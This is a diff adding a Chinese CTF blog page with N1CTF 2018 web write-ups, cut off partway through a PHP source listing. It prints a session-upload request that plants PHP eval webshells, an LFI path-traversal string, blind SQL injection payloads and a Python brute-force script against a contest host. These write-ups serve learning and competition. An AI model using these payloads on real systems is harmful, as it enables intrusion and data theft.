@@ -1,0 +1,2112 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>分类: jekyll update - Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="CTF、网络安全爱好者">
+<meta name="keywords" content="CTF,网络安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Junay的博客">
+<meta property="og:url" content="http://yoursite.com/categories/jekyll-update/page/2/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="CTF、网络安全爱好者">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Junay的博客">
+<meta name="twitter:description" content="CTF、网络安全爱好者">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Junay的博客" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    <div class="card-content">
+        <nav class="breadcrumb" aria-label="breadcrumbs">
+        <ul>
+            <li><a href="/categories">分类</a></li>
+            
+            <li class="is-active"><a href="#" aria-current="page">jekyll update</a></li>
+        </ul>
+        </nav>
+    </div>
+</div>
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-13T16:40:00.000Z">2018-03-14</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 868 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-easy-harder-php/">N1CTF easy_harder_php非预期解法</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;上篇文章中复现了官方的预期解法，这里单独将<code>非预期</code>解法拿出来复现一遍并记录解题过程。<code>非预期</code>解法有三种：</p>
+<ul>
+<li><strong>1、session.upload开启导致session包含漏洞</strong></li>
+<li><strong>2、xdebug</strong></li>
+<li><strong>3、/tmp/临时文件竞争</strong></li>
+</ul>
+<p>&emsp;&emsp;本来以为pull下的docker有<code>easy php</code>的环境，但经过检查后却发现不满足条件，所以这篇文章主要起到<code>备忘录</code>的作用，以供以后遇到满足的条件时方便查阅。</p>
+<h2 id="1、session-upload开启导致包含漏洞"><a href="#1、session-upload开启导致包含漏洞" class="headerlink" title="1、session.upload开启导致包含漏洞"></a>1、session.upload开启导致包含漏洞</h2><p>&emsp;&emsp;<code>session.upload_progress.enabled</code>这个参数在php.ini <code>默认开启</code>，需要手动置为<code>Off</code>，如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_&#123;your_php_session_id&#125;</span><br></pre></td></tr></table></figure></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/58.png" width="60%"><br></div><br>&emsp;&emsp;但是从官方拉下来的源码中，发现这个<code>session.upload_progress.enabled</code>参数已经被关闭，所以这个解法就没法复现了。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/59.png" width="70%"><br></div><br>&emsp;&emsp;所以这里只进行记录这个解法的流程。</p>
+<p>&emsp;&emsp;首先构造一个这样的报文(from @berTrAM)，不断的向服务端发送<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 47.52.246.175:23333</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Content-Length: 648</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">&lt;?=`echo &apos;&lt;?php eval($_REQUEST[bertram])?&gt;&apos;&gt;bertram.php`?&gt;</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file2&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.asp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt; %eval request(&quot;a&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundary2rwkUEtFdqhGMHqV--</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;服务器就会在<code>/var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</code>中记录这个上传的文件。接着我们不断刷新生成包含恶意php代码的文件，然后通过LFI包含这个文件<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;即可getshell</p>
+<h2 id="2、xdebug"><a href="#2、xdebug" class="headerlink" title="2、xdebug"></a>2、xdebug</h2><p>&emsp;&emsp;要使用<code>Xdebug</code>get shell，首先服务器要开启如下参数：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/60.png"><br></div><br>&emsp;&emsp;但pull下来的docker中，这个参数都不被满足，所以又只能记录利用方式，等以后碰到了方便查阅。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/61.png"><br></div><br>&emsp;&emsp;这里参照<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">rr师傅的博客</a>，首先我们先确定是否可以利用<code>xdebug</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/62.png"><br></div><br>&emsp;&emsp;当 X-Forwarded-For 的<code>地址</code>（这里就是：ricterz.me）的 9000 端口收到连接请求，就可以确定开启了 Xdebug，且开启了 xdebug.remote_connect_back。</p>
+<p>&emsp;&emsp;再下面的操作就参照师傅的博客就行了，这里因为没有环境就不再<code>照抄</code>了。</p>
+<h2 id="3、-tmp-临时文件竞争"><a href="#3、-tmp-临时文件竞争" class="headerlink" title="3、/tmp/临时文件竞争"></a>3、/tmp/临时文件竞争</h2><p>&emsp;&emsp;要使用<code>临时文件竞争</code>，phpinfo的环境要有如下配置：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/63.png"><br></div><br>&emsp;&emsp;但公开的docker还是不满足条件。。。</p>
+<p>&emsp;&emsp;它大概的原理就是趁系统还没把临时文件删除之前将这个文件包含起来，从而getshell，通常系统的守护进行删除时隔很小，大概在2~3s，所以，我们要使用多线程上传，然后不断刷新包含文件。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>&emsp;&emsp;<a href="https://www.secsearch.top/?kw=n1ctf" target="_blank" rel="noopener">黑塔搜索结果</a><br><br>&emsp;&emsp;<a href="https://xianzhi.aliyun.com/forum/topic/2148" target="_blank" rel="noopener">官方writeup</a><br><br>&emsp;&emsp;<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="noopener">国外大佬-条件竞争writeup</a><br><br>&emsp;&emsp;<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">Xdebug利用</a><br><br>&emsp;&emsp;<a href="http://bendawang.site/2018/03/13/N1CTF-2018-Web-writeup/" target="_blank" rel="noopener">Bendawang</a><br></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 772 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-writeup/">N1CTF 77777 writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这是我及我所在的团队第一次参加<code>正式</code>的CTF比赛，所取得的成绩也还算满意，比赛过程中作者负责<code>web</code>方向，比赛中的成果就是两道<code>77777</code>。</p>
+<h3 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h3><p>&emsp;&emsp;题目描述：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/1.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/2.png"><br></div><br>&emsp;&emsp;这道题最坑的就是一开始<code>没有判断出是否注入成功的依据</code>，后面经师兄指导才发现依据就是注入的数字是否已经改变，当然这道题的环境官方也说明每个队注入<code>没有隔离开</code>，造成即使注入成功也可能被别的队刷走，从而影响判断。</p>
+<p>&emsp;&emsp;又因为它是<code>sptintf(&quot;xxx%d%s&quot;)</code>，所以注入应该在<code>str</code>的地方，也就是在<code>hi</code>中进行注入，payload：<code>hi=000 where ord(substr(password, 1, 1))&gt;100</code>，因为是在<code>update users set</code>中注入，所以这里不需要再使用<code>union,select</code>等方法了。完整的payload如下图：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/3.png"><br></div><br>&emsp;&emsp;如果注入成功，则会返回你的<code>flag</code>字段，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/4.png"><br></div><br>&emsp;&emsp;由于这个题的环境不稳定，不太适合脚本的判断，所以，就手工注入一遍了。</p>
+<h3 id="77777-2"><a href="#77777-2" class="headerlink" title="77777 2"></a>77777 2</h3><p>&emsp;&emsp;这道题跟上一道提供的描述是一样的，不同的是对<code>hi</code>进行了更严格的过滤，上一道的payload就无效了。</p>
+<p>&emsp;&emsp;这道题过滤了<code>and or || &amp; &amp;&amp;</code>（为了不产生二义，这里用空格分隔），但是唯独没有过滤掉<code>|</code>。所以我们可以选择<code>|</code>进行<code>位注入</code>。然后在检测一下，没有被过滤的是：<code>substr select from if</code>，所以考虑用<code>if</code>替代<code>where</code>进行判断。</p>
+<p>&emsp;&emsp;经过一轮苦逼的测试，终于搞出一个payload：<code>hi=000 |  IF (substr((select substr( pw from 1)),1,1)&gt;&#39;z&#39;,1,0)</code>，这里<code>( pw</code>中间一定要有<code>空格</code>，不然无法绕过。另一个要说的就是<code>pw from 1</code>，它会返回<code>pw字段从1开始的所有值</code>。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pw = &apos;flag&#123;123456&#125;&apos;</span><br><span class="line">pw from 1 ---&gt; flag&#123;123456&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;payload：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/5.png"><br></div><br>&emsp;&emsp;判断的依据是返回的数字的最后一位，如：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/6.png"><br></div><br>&emsp;&emsp;如果是返回错误则是如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/7.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/8.png"><br></div></p>
+<blockquote>
+<p>另一个tips就是数字的后一位一定要<code>0</code>，不然如果是<code>1</code>的话就无法判断了。<code>1 |</code>任何也是真。</p>
+</blockquote>
+<p>&emsp;&emsp;再然后就是逐位的判断，有些数字会被过滤掉，这点上不知道是我的payload有问题还是本来就是这样。。。。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/9.png"><br></div><br>&emsp;&emsp;如上，逐位比较的时候使用<code>+1</code>的方法，如果直接用2,3,4,…的话有些数字<code>会被过滤</code>，还有就是有些字符也会被过滤，但无关flag字段。<br>&emsp;&emsp;附上脚本：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://47.52.137.90:20000/'</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    lc = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(i):</span><br><span class="line">        lc += <span class="hljs-string">'+1'</span></span><br><span class="line">    lc = lc[<span class="hljs-number">1</span>:]</span><br><span class="line">    sql = <span class="hljs-string">'000 |  IF (substr((select substr( pw from 1)),&#123;0&#125;,1)&gt;\'&#123;1&#125;\',1,0)'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>):</span><br><span class="line">        sqli = sql.format(lc, chr(ch))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="hljs-string">'flag'</span>: <span class="hljs-number">123</span>,</span><br><span class="line">            <span class="hljs-string">'hi'</span>: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment"># print(data)</span></span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        text = html.text</span><br><span class="line">        <span class="hljs-comment"># print(text)</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">'123000'</span> <span class="hljs-keyword">in</span> text:</span><br><span class="line">            flag += chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-11T16:40:00.000Z">2018-03-12</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 分钟 读完 (大约 1714 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/n1ctf-funning-eating-cms/">N1CTF funning eating cms writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;这道题get到点时已经太晚了，比赛期间的进度也可以算是达到了<code>80%</code>，略微遗憾。</p>
+<p>&emsp;&emsp;打开题目的链接，发现只有<code>login</code>登陆表，尝试访问<code>register.php</code>，返回注册页面，先注册一个账号。用注册的账号登陆后发现是如下页面。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/10.png"><br></div><br>&emsp;&emsp;开始猜测是<code>文件包含漏洞</code>，一开始是尝试读取<code>index.php</code>的源码，但发现没有返回数据。</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/11.png"><br></div><br>&emsp;&emsp;然后尝试只读<code>index</code>，发现这才是正确的打开方式:)</p>
+<p><div align="center"><br>    <img src="/images/posts/n1ctf/12.png"><br></div><br>&emsp;&emsp;解密后的代码如下：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">"function.php"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'login'</span>] ))&#123;</span><br><span class="line">    Header(<span class="hljs-string">"Location: user.php?page=info"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"templates/index.html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;用类似的办法将其他文件给读出来。<br><b>info.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can not visit it directly "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"templates/info.html"</span>;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>info.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">"you can not visit it directly "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">include</span> <span class="hljs-string">"templates/guest.html"</span>;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>login.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">"function.php"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'action'</span>] === <span class="hljs-string">'login'</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="hljs-string">'username'</span>];</span><br><span class="line">        $pass = $_POST[<span class="hljs-string">'password'</span>];</span><br><span class="line">        $res = login($user,$pass);</span><br><span class="line">        <span class="hljs-keyword">if</span>(!$res)&#123;</span><br><span class="line">            Header(<span class="hljs-string">"Location: index.php"</span>);</span><br><span class="line">        &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">            Header(<span class="hljs-string">"Location: user.php?page=info"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        Header(<span class="hljs-string">"Location: error_parameter.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">'action'</span>] === <span class="hljs-string">'logout'</span>)&#123;</span><br><span class="line">    logout();</span><br><span class="line">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">    Header(<span class="hljs-string">"Location: error_parameter.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>register.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">require_once</span> <span class="hljs-string">"function.php"</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'action'</span>] === <span class="hljs-string">'register'</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="hljs-string">'username'</span>];</span><br><span class="line">        $pass = $_POST[<span class="hljs-string">'password'</span>];</span><br><span class="line">        $res = register($user,$pass);</span><br><span class="line">        <span class="hljs-keyword">if</span>($res)&#123;</span><br><span class="line">            Header(<span class="hljs-string">"Location: index.php"</span>);</span><br><span class="line">        &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="line">            $errmsg = <span class="hljs-string">"Username has been registered!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        Header(<span class="hljs-string">"Location: error_parameter.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">if</span> (!$_SESSION[<span class="hljs-string">'login'</span>]) &#123;</span><br><span class="line">    <span class="hljs-keyword">include</span> <span class="hljs-string">"templates/register.html"</span>;</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="hljs-string">"Location : user.php?page=info"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><br><b>function.php</b><br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 